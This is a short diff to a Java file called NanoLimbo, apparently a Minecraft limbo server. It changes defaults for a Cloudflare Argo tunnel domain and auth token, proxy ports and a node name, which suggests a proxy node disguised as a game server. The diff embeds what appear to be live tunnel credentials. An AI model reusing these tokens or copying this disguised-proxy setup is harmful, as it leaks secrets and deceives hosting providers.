@@ -128,17 +128,17 @@ public final class NanoLimbo {
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
         envVars.put("ARGO_PORT", "10010");
-        envVars.put("ARGO_DOMAIN", "zampto.larkspur.de5.net");
-        envVars.put("ARGO_AUTH", "eyJhIjoiMjgzYWExNTQ0MzRhODg0MDgxM2JkNjUyOTVmNzVhNGYiLCJ0IjoiNjc5YjFiNGEtMzExMi00OWUxLThiMTItMjkzNWZiZjE1ZWI5IiwicyI6Ik1EaG1NakJqTkRndE1EZzFZeTAwTjJFM0xUbGhNR0l0TVdRM01EZzRNVGhoWVRJNSJ9");
+        envVars.put("ARGO_DOMAIN", "spaceify.mufeng.de5.net");
+        envVars.put("ARGO_AUTH", "eyJhIjoiMjgzYWExNTQ0MzRhODg0MDgxM2JkNjUyOTVmNzVhNGYiLCJ0IjoiZDYwNTcyMjEtZWMwZi00YWJhLWJlOGUtMDAwNjk4ZDhiNTYwIiwicyI6Ik9ESmxabUk0Tm1NdE5HTTNOeTAwWVRjNExUaGhaVE10TnpVd016UXhabUk1TjJZNCJ9");
         envVars.put("HY2_PORT", "");
-        envVars.put("TUIC_PORT", "22258");
-        envVars.put("REALITY_PORT", "22258");
+        envVars.put("TUIC_PORT", "25905");
+        envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "zampto");
+        envVars.put("NAME", "spaceify");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
